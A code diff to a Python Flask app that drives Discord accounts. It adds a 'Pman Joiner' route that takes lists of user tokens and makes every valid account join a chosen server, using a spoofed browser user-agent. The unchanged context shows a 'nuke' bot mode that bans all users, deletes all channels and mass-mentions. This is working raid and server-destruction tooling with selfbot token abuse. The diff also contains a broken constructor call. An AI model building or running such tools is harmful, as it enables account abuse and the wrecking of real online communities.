@@ -1,10 +1,32 @@
-import traceback, threading, requests, datetime, asyncio, discord, random, string, base64
+import traceback, threading, requests, datetime, asyncio, discord, random, string, base64, json
 from flask import Flask, request, redirect, render_template
 
 app = Flask(__name__)
 
 logs = {}
 stops = []
+discordApiBaseUrl = "https://discord.com/api/v9"
+
+class DiscordApis():
+    def __init__(self, logId:str, token:str):
+        self.logId = logId
+        self.token = token
+    def generateHeaders(self):
+        headers = {
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
+            "Authorization": self.token
+        }
+        return headers
+    def getUserInfo(self):
+        res = requests.get(f"{discordApiBaseUrl}/users/@me", headers=self.generateHeaders())
+        return str(res.status_code)[0] == "2", json.loads(res.text)
+    def joinGuild(self, inviteCode:str):
+        res = requests.post(f"{discordApiBaseUrl}/invites/{inviteCode}", headers=self.generateHeaders())
+        if str(res.status_code)[0] == "2":
+            logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(str(self.getUserInfo()[1]["id"]).encode()).decode()+"\n"
+        else:
+            logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(str(self.getUserInfo()[1]["id"]).encode()).decode()+"\n"
+        return str(res.status_code)[0] == "2"
 
 class DiscordBot(discord.Client):
     def __init__(self, logId:str, token:str, id:int, name:str, latency:int, messages:list[str], option:list, mode:int):
@@ -21,14 +43,6 @@ class DiscordBot(discord.Client):
         if mode == 0:
             self.allUserBan, self.allChannelDelete, self.randomMention, self.exclusionServerIds = option
         self.mode = mode
-    def isEnableToken(self, token:str):
-        if not token: return False
-        headers = {
-            "Content-Type": "application/json",
-            "Authorization": token
-        }
-        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
-        return str(res.status_code)[0] == "2"
     async def banUser(self, user:discord.Member):
         try:
             await user.ban(reason="Fuck Server User")
@@ -144,13 +158,13 @@ class DiscordBot(discord.Client):
             return
     def runBot(self):
         try:
-            if not self.isEnableToken(self.token):
+            apis = DiscordApis(self.token)
+            if not apis.getUserInfo()[0]:
                 logs[self.logId] += f"Error: invalid token - {self.token}\n"
                 return
             self.run(self.token, reconnect=True)
         except:
             logs[self.logId] += f"Error:\n{traceback.format_exc()}"
-
 
 @app.route('/getLog', methods=["GET"])
 def getLog():
@@ -163,6 +177,27 @@ def getLog():
 def stop():
     stops.append(request.args.get("id"))
     return redirect('nuke')
+
+@app.route('/joinGuild', methods=["GET", "POST"])
+def joinGuild():
+    if request.method == "POST":
+        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
+        logs[logId] = "Start Pman Joiner PPP\n\n"
+        
+        tokens = request.form["tokens"].split("\r\n")
+        guildInviteCode = request.form["guildInviteCode"]
+        
+        for token in tokens:
+            apis = DiscordApis(logId, token)
+            userInfo = apis.getUserInfo()
+            if userInfo[0]:
+                logs[logId] += "OK Token: "+base64.b64encode(str(userInfo[1]["id"]).encode()).decode()+"\n"
+                t = threading.Thread(target=apis.joinGuild, args=(guildInviteCode,), daemon=True)
+                t.start()
+            else:
+                logs[logId] += f"Error: invalid token - {token}\n"
+        return render_template('selfBotJoinGuild.html', logId=logId)
+    return render_template('selfBotJoinGuild.html')
 
 @app.route('/nuke', methods=["GET", "POST"])
 def nuke():
